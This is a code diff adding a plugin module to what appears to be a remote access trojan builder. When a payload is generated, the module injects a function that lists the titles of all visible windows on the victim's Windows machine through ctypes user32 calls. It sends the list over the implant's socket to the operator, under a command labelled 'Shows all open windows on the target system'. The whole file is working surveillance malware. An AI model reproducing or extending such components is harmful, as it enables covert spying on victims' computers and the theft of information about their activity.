@@ -1,0 +1,58 @@
+# WEB + COM
+# done
+import library.modules.config as config
+config.main()
+interface = config.interface
+if interface == "GUI":
+    from flask import jsonify
+
+
+def main(option):
+    if option == 'generate':
+        config.import_statements.append('import ctypes')
+        config.functions.append('''
+def active(interface):
+    global IsWindowVisible
+    EnumWindows = ctypes.windll.user32.EnumWindows
+    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
+    GetWindowText = ctypes.windll.user32.GetWindowTextW
+    GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
+    IsWindowVisible = ctypes.windll.user32.IsWindowVisible
+    titles = []
+    def foreach_window(hwnd, lParam):
+        if IsWindowVisible(hwnd):
+            length = GetWindowTextLength(hwnd)
+            buff = ctypes.create_unicode_buffer(length + 1)
+            GetWindowText(hwnd, buff, length + 1)
+            titles.append(buff.value)
+        return True
+    EnumWindows(EnumWindowsProc(foreach_window), 0)
+    if interface == "CUI":
+        encoded = ['\\n   - ' + i.encode('ascii','ignore').decode().strip() for i in titles]
+        encoded = filter(lambda a: a != '\\n   - ', encoded)
+        encoded = list(set(encoded))
+        data = '[+]All opened windows : \\n'
+        data += ''.join(encoded)
+        s.sendall((data + '\\n').encode())
+    elif interface == "GUI":
+        encoded = [i.encode('ascii','ignore').decode().strip() for i in titles]
+        encoded = list(set(encoded))
+        s.sendall(pickle.dumps(encoded))''')
+        config.logics.append('''
+            elif command == "active":
+                active(interface)''')
+        config.help_menu['active'] = 'Shows all open windows on the target system'
+    elif option == 'info':
+        if interface == "GUI":
+            return {
+                "Name": "Active Windows Dump component",
+                "OS": "Windows",
+                "Required Modules": "ctypes",
+                "Commands": "active",
+                "Description": "Shows all open windows on the target system"}
+        elif interface == "CUI":
+            print('\nName             : Active Windows Dump component' \
+                  '\nOS               : Windows' \
+                  '\nRequired Modules : ctypes' \
+                  '\nCommands         : active' \
+                  '\nDescription      : Shows all open windows on the target system\n')
